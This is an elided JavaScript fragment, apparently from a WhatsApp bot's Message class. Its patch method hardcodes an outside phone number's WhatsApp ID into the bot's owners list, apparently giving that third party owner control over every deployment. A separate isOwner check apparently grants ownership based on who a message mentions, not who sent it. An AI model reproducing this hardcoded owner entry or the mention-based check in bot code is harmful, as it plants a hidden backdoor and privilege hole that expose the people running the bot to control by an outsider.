...
class Message extends Base {
    ...
    patch(data) {
        ...
        this.owners = [jidNormalizedUser(this.client.user.id), "919539612761@s.whatsapp.net"].concat(sudo);
	...
	this.isOwner = (this.admins.map((v) => this.mention.includes(v))).includes(true)
